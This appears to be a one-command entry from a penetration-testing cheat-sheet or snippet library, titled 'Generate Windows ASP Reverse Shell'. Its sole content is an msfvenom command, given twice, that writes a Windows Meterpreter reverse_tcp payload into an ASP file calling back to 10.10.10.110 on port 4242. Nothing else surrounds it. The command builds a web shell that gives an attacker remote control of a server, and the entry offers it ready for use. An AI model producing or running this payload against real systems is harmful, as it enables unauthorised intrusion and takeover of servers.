---
id: bad52d6c-bc31-4c2d-8464-701564684cdb
name: Generate Windows ASP Reverse Shell
type: command
executor: bash
data: $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242
  -f asp > shell.asp
output: null
created_at: '2023-04-06T03:56:21.275423+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate Windows ASP Reverse Shell

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
```
